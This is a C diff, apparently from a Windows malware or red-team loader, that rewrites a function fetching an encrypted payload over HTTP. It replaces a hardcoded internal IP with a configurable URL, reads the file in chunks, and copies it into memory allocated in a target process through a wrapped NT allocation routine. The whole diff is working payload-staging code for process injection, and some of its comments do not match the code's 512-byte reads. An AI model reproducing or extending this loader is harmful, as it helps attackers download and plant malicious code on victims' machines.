@@ -10,50 +10,91 @@
 #include <wininet.h>
 #pragma comment(lib, "wininit.lib")
 
-#define PAYLOAD_SIZE 276
+#define PAYLOAD_SIZE 512
 
-BOOL InitConnection(IN HANDLE hProcess, IN OUT LPVOID lpBuffer) {
+PVOID FetchPayload(IN HANDLE hProcess, IN OUT PSIZE_T psSize) {
+    PVOID lpBuffer = NULL;
+    HINTERNET	hInternet = NULL;
+    HINTERNET   hInternetFile = NULL;
 
-    HINTERNET	hInternet       = NULL;
-    HINTERNET   hInternetFile   = NULL;
+    DWORD		dwBytesRead = 0;
 
-    DWORD		dwBytesRead     = 0;
+    SIZE_T      pBytesSize = 0;
+    PBYTE		pBytes = NULL; // Used as the total payload heap buffer
+    PBYTE		pTmpBytes = NULL; // Used as the temp buffer of size 16 bytes
 
-    SIZE_T		sSize           = 276;     // Total payload size
-
-
+    // Opening an internet session handle
     hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
     if (hInternet == NULL) {
-        wprintf(L"[!] InternetOpenW Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-    // Opening a handle to the payload's URL
-    hInternetFile = InternetOpenUrlW(hInternet, L"http://172.16.7.130:8081/encrypted.bin", NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-    if (hInternetFile == NULL) {
-        wprintf(L"[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
-        return FALSE;
+        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+        return NULL;
     }
 
-    wprintf(L"hInternetFile: %p\n", hInternetFile);
+    // Opening a handle to the payload's URL
+    hInternetFile = InternetOpenUrlW(hInternet, Instance->url, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    if (hInternetFile == NULL) {
+        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+        return NULL;
+    }
 
     // Allocating 16 bytes to the temp buffer
-    NTSTATUS status = Instance->SithVirtualAlloc(hProcess, lpBuffer, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    wprintf(L"Allocated Memory: %X\n", status);
+    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 512);
+    if (pTmpBytes == NULL) {
+        return NULL;
+    }
+
+    while (TRUE) {
+
+        // Reading 16 bytes to the temp buffer
+        // InternetReadFile will read less bytes in case the final chunk is less than 16 bytes
+        if (!InternetReadFile(hInternetFile, pTmpBytes, 512, &dwBytesRead)) {
+            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+            return NULL;
+        }
+
+        // Updating the size of the total buffer
+        pBytesSize += dwBytesRead;
+
+        // In case the total buffer is not allocated yet
+        // then allocate it equal to the size of the bytes read since it may be less than 16 bytes
+        if (pBytes == NULL)
+            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+        else
+            // Otherwise, reallocate the pBytes to equal to the total size, sSize.
+            // This is required in order to fit the whole payload
+            pBytes = (PBYTE)LocalReAlloc(pBytes, pBytesSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+        if (pBytes == NULL) {
+            return NULL;
+        }
+
+        // Append the temp buffer to the end of the total buffer
+        memcpy((PVOID)(pBytes + (pBytesSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+        // Clean up the temp buffer
+        memset(pTmpBytes, '\0', dwBytesRead);
+
+        // If less than 16 bytes were read it means the end of the file was reached
+        // Therefore exit the loop
+        if (dwBytesRead < 512) {
+            break;
+        }
+        // Otherwise, read the next 16 bytes
+    }
+
+    *psSize = pBytesSize;
+    NTSTATUS status = Instance->SithVirtualAlloc(hProcess, &lpBuffer, 0, &pBytesSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(status)) {
-        return FALSE;
+        wprintf(L"Failed to Allocate Memory! %X\n", status);
     }
 
-    wprintf(L"Allocated Memory at Address: %p\n", lpBuffer);
+    memcpy(lpBuffer, pBytes, *psSize);
 
-    // Dereference lpBuffer and copy payload
-    if (!InternetReadFile(hInternetFile, *(LPVOID*)lpBuffer, sSize, &dwBytesRead)) {
-        wprintf(L"[!] InternetReadFile Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-    wprintf(L"Wrote %d bytes to buffer: %p \n", &dwBytesRead, lpBuffer);
-    // Cleanup
+    // Clean up
     InternetCloseHandle(hInternet);
     InternetCloseHandle(hInternetFile);
     InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-    return TRUE;
+    LocalFree(pTmpBytes);
+    LocalFree(pBytes);
+    return lpBuffer;
 }
